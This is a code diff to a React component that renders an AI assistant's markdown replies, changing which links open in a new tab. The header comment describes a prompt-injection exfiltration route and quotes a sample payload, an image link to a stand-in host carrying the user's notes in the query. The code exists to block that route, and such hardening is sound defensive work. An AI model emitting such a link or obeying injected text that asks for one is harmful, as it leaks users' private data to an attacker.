@@ -11,8 +11,9 @@
 // model writes would be fetched on render, which a prompt injection can use
 // to send data out (`![](https://x/?d=<notes>)`), so a web image becomes a
 // link the viewer must click, or only its text inside a link (an anchor never
-// nests in an anchor). Only a web link opens in a new tab; a footnote jumps
-// within the reply. A page citation becomes a chip.
+// nests in an anchor). A footnote jumps within the reply; every other link
+// opens in a new tab, so none navigates the imago shell away. A page citation
+// becomes a chip.
 
 import { createContext, memo, useContext, useMemo, type ReactNode } from 'react';
 import { defaultRehypePlugins, defaultRemarkPlugins, Streamdown, type StreamdownProps } from 'streamdown';
@@ -60,6 +61,9 @@ const rehypePlugins: StreamdownProps['rehypePlugins'] = [
 const InLink = createContext(false);
 
 const isWebUrl = (url: string): boolean => /^https?:\/\//i.test(url);
+
+/** A jump within the reply: a footnote or its back link. */
+const isFragment = (url: string): boolean => url.startsWith('#');
 
 /**
  * GFM already prefixes footnote ids with `user-content-`, and sanitising
@@ -112,13 +116,14 @@ const components = (citationDriveId: string | null): StreamdownProps['components
     }
     // Sanitising drops an unsafe href: what is left is only text.
     if (href === undefined || href === '') return <span>{children}</span>;
-    // A footnote and its back link jump within the reply; only the web opens a new tab.
-    return isWebUrl(href) ? (
-      <a href={href} target="_blank" rel="noopener noreferrer" className={proseClasses.a}>
+    // A footnote and its back link jump within the reply. Anything else, a
+    // relative link included, opens a new tab rather than replacing the shell.
+    return isFragment(href) ? (
+      <a href={href} id={footnoteId(id)} className={proseClasses.a}>
         {label}
       </a>
     ) : (
-      <a href={href} id={footnoteId(id)} className={proseClasses.a}>
+      <a href={href} target="_blank" rel="noopener noreferrer" className={proseClasses.a}>
         {label}
       </a>
     );
